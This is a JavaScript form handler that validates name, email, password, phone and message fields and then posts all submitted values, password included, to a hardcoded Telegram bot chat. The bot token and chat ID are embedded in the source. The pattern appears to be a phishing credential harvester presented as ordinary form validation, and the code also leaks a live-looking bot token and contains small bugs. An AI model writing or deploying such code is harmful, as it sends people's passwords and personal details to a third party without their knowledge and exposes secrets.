const form = document.querySelector("form");
const fullName = document.getElementById("name");
const lastName = document.getElementById("name");
const email = document.getElementById("email");
const Password = document.getElementById("password");
const phone = document.getElementById("phone");
const subject = document.getElementById("subject");
const mess = document.getElementById("message");
let popup = document.getElementById("popup");

function checkInputs() {
  const items = document.querySelectorAll(".item");

  for (const item of items) {
    if (item.value == "") {
      item.classList.add("error");
      item.parentElement.classList.add("error");
      return;
    } else {
      item.classList.remove("error");
      item.parentElement.classList.remove("error");
    }

    if (items[1].value != "") {
      checkEmail();
    }

    items[1].addEventListener("keyup", () => {
      checkEmail();
    });

    item.addEventListener("keyup", () => {
      if (item.value != "") {
        item.classList.remove("error");
        item.parentElement.classList.remove("error");
      } else {
        item.classList.add("error");
        item.parentElement.classList.add("error");
        return;
      }
    });
  }
  openPopup();
  const details = [];
  for (const item of items) {
    details.push(item.value);
  }
  details.join(",")
  sendDetails(details)
}
async function sendDetails(message) {
  const botToken = "7645426236:AAE0duYES0GqU05Bl_bR-awgptiruKueFA8"; // Replace with your bot's token
  const chatId = "5697249220"; // Replace with the recipient's chat ID or your own chat ID

  // URL for the Telegram Bot API
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  // Request payload
  const data = {
    chat_id: chatId,
    text: message,
  };

  // Send a POST request using fetch
  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Message sent successfully:", data);
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });
}
function checkEmail() {
  const emailRegex = /^([a-z\d\.-]+)@([a-z\d-]+)\.([a-z]{2,3})(\.[a-z]{2,3})?$/;
  const errorTxtEmail = document.querySelector(".error-txt.email");

  if (!email.value.match(emailRegex)) {
    email.classList.add("error");
    email.parentElement.classList.add("error");

    if (email.value != "") {
      errorTxtEmail.innerText = "Enter a valid email address";
    } else {
      errorTxtEmail.innerText = "Email Address can't be blank!";
    }
  } else {
    email.classList.remove("error");
    email.parentElement.classList.remove("error");
  }
}

function openPopup() {
  popup.classList.add("open-popup");
}

function closePopup() {
  popup.classList.remove("open-popup");
}

form.addEventListener("submit", (e) => {
  e.preventDefault();
  checkInputs();
});
